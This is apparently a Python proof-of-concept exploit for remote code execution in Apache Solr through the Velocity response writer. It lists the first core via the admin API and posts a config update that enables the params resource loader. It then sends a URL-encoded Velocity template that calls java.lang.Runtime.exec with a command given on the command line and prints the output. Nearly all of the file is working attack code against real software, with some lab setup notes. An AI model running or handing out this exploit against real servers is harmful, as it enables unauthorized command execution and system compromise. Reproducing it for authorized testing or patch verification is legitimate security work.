#coding=utf-8

import requests
import sys
import json

'''
Author: shadowsock5 on 2019/10/31
References: 
- https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt
- https://lucene.apache.org/solr/guide/8_2/requesthandlers-and-searchcomponents-in-solrconfig.html
- https://lucene.apache.org/solr/guide/8_2/velocity-response-writer.html
- https://mp.weixin.qq.com/s/TuB56pFtacs3GtEemQnGqA

reproduces tips:
copy velocity related jar to server/solr-webapp/webapp/WEB-INF/lib/ directory.
```bash
for i in `find contrib/velocity/lib dist -name *.jar |grep velocity`; do cp  $i server/solr-webapp/webapp/WEB-INF/lib/; done
```

soloconfig.xml:
<?xml version="1.0" encoding="UTF-8" ?>
<config>
<luceneMatchVersion>8.2.0</luceneMatchVersion>

<requestHandler name="/select" class="solr.SearchHandler">
</requestHandler>

<queryResponseWriter name="velocity" class="solr.VelocityResponseWriter">
</queryResponseWriter>

</config>
'''

remote = sys.argv[1] #"http://cqq.com:8983"   # Change this to the base url(protocol, hostname and port) you want to exploit.

command = sys.argv[2] #"id"

payload1_j = {
  "update-queryresponsewriter": {
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "params.resource.loader.enabled": "true"
  }
}
payload2 = "wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{0}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end".format(command)


cores_url = remote + "/solr/admin/cores?wt=json"

''' fetch the core name '''
def get_core_name():
    r = requests.get(cores_url, verify=False, allow_redirects=False)
    a = []
    if r.status_code == 200:
        if r.json()['status'] == "":
            print("[!] No core availble! Quit!")
            sys.exit()
        else:
            a = list(r.json()['status'].keys())
            try:
                print(a)
            except:
                sys.exit("no core!")
    else:
        sys.exit("Wrong!")
    return a[0]


core_name = get_core_name()

select_url = "/solr/" + core_name + "/select"

config_url = "/solr/" + core_name + "/config"

url1 = remote + config_url
url2 = remote + select_url + "?" + payload2


r1 = requests.post(url1, json=payload1_j)
if r1.status_code == 200:
    r2 = requests.get(url2)
    if r2.status_code == 500:
        sys.exit("500 failed!")
    print(r2.status_code)
    print(r2.content)
